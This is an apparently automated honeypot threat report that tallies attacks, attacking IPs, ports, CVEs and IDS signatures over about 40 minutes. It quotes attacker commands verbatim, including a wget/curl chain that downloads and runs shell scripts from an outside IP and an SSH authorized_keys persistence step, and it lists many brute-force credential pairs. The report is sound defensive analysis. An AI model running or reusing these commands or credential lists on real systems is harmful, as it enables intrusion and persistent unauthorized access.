Honeypot Attack Summary Report

Report Generated: 2025-10-20T00:01:31Z
Timeframe: 2025-10-19T23:20:01Z to 2025-10-20T00:00:01Z

Files used to generate this report:
- agg_log_20251019T232001Z.json
- agg_log_20251019T234001Z.json
- agg_log_20251020T000001Z.json

Executive Summary
This report summarizes honeypot activity over a period of approximately 40 minutes. A total of 6978 attacks were recorded across various honeypots. The most targeted services were SSH (Cowrie) and various TCP/UDP ports (Honeytrap). A significant number of attacks originated from IP address 72.146.232.13. Attackers attempted a variety of commands, primarily focused on reconnaissance and establishing persistent access. Multiple CVEs were targeted, and a large number of security signatures were triggered.

Detailed Analysis

Attacks by Honeypot:
- Cowrie: 4087
- Honeytrap: 1177
- Suricata: 664
- Ciscoasa: 584
- Dionaea: 185
- Sentrypeer: 208
- Tanner: 12
- Mailoney: 12
- H0neytr4p: 10
- Adbhoney: 9
- Redishoneypot: 3
- Heralding: 3
- Honeyaml: 5
- ConPot: 19

Top Attacking IPs:
- 72.146.232.13: 606
- 206.189.97.124: 566
- 102.88.137.213: 254
- 193.32.162.157: 250
- 103.186.1.120: 188
- 103.174.114.50: 218
- 195.178.191.5: 199
- 27.254.137.144: 194
- 103.250.10.128: 169
- 107.170.36.5: 154
- 185.243.5.103: 162
- 68.183.149.135: 112
- 60.217.64.137: 73
- 130.83.245.115: 78
- 203.83.234.180: 65
- 180.76.144.122: 48
- 167.250.224.25: 50
- 188.246.224.87: 42
- 172.174.5.146: 91
- 197.5.145.102: 144
- 159.89.22.242: 143

Top Targeted Ports/Protocols:
- 22: 741
- 5060: 208
- 445: 120
- 8333: 106
- 1433: 43
- 5904: 77
- 5905: 77
- 5901: 41
- 5902: 38
- 5903: 37
- TCP/22: 49
- TCP/1433: 47
- UDP/53: 5
- UDP/161: 15

Most Common CVEs:
- CVE-2021-3449
- CVE-2019-11500
- CVE-2021-35394
- CVE-2001-0414
- CVE-2005-4050
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517

Commands Attempted by Attackers:
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- which ls
- ls -lh $(which ls)
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- echo -e "..."|passwd|bash
- Enter new UNIX password: 
- rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; curl http://213.209.143.62/c.sh; sh c.sh; wget http://213.209.143.62/wget.sh; sh wget.sh; curl http://213.209.143.62/wget.sh; sh wget.sh; busybox wget http://213.209.143.62/wget.sh; sh wget.sh; busybox curl http://213.209.143.62/wget.sh; sh wget.sh

Signatures Triggered:
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET INFO Reserved Internal IP Traffic
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET CINS Active Threat Intelligence Poor Reputation IP group 48
- ET SCAN Potential SSH Scan
- ET CINS Active Threat Intelligence Poor Reputation IP group 47
- ET CINS Active Threat Intelligence Poor Reputation IP group 50
- ET CINS Active Threat Intelligence Poor Reputation IP group 43
- ET CINS Active Threat Intelligence Poor Reputation IP group 44
- ET SCAN Suspicious inbound to MSSQL port 1433
- ET CINS Active Threat Intelligence Poor Reputation IP group 49
- ET HUNTING RDP Authentication Bypass Attempt
- GPL SNMP request udp
- ET CINS Active Threat Intelligence Poor Reputation IP group 45
- ET INFO CURL User Agent
- GPL SNMP public access udp

Users / Login Attempts:
- 345gs5662d34/345gs5662d34
- user01/Password01
- user01/3245gs5662d34
- tanulo/tanulo123
- ftp-user/ftp-user
- root/bugaosuni
- root/qwe123456
- operator/123321
- gestion/gestion
- default/default2016
- root/db2admin
- root/8ab8cx
- myuser/myuser
- root/3edc#EDC
- arkserver/123
- root/Welcome@2025
- guillermo/123
- material/material
- deploy/123123
- root/8d3ywam0
- guest/6666666
- fts/123
- root/root2011
- root2/123
- root/Qwerty12345
- root/8hy30DiJzH.
- almacen/123
- root/abc123456@
- neil/neil123
- es_user/es_user123
- git/git@1234
- root/8kuej4cotcjznFf
- nobody/44
- admin/qazwsx
- guest/qwerty123456
- vyos/vyos2025
- nobody/nobody666
- unknown/8888
- root/8maestro54
- slave/123
- fred/123
- admin/admin2008
- remoto/remoto
- vianmj/vianmj
- root/Dy123456
- root/8sis419
- administrador/123
- debian/333
- nobody/888888
- root/8wHXUqc5
- test/test2012
- ansible/ansible
- seven/123

Files Uploaded/Downloaded:
- welcome.jpg)
- writing.jpg)
- tags.jpg)
- loader.sh|sh;#
- wget.sh;
- w.sh;
- c.sh;

HTTP User-Agents:
- No HTTP user agents were recorded in this period.

SSH Clients:
- No specific SSH clients were recorded in this period.

SSH Servers:
- No specific SSH servers were recorded in this period.

Top Attacker AS Organizations:
- No attacker AS organizations were recorded in this period.

Key Observations and Anomalies:
- A large number of commands executed by attackers are related to disabling security measures (chattr) and adding SSH keys for persistent access.
- The command to download and execute scripts from `213.209.143.62` indicates a coordinated attack to install malware.
- The variety of credentials used in login attempts suggests widespread brute-force attacks using common or previously breached passwords.
- The presence of scans for MS-SQL (port 1433) and RDP indicates that attackers are looking for multiple ways to compromise the system, not just SSH.
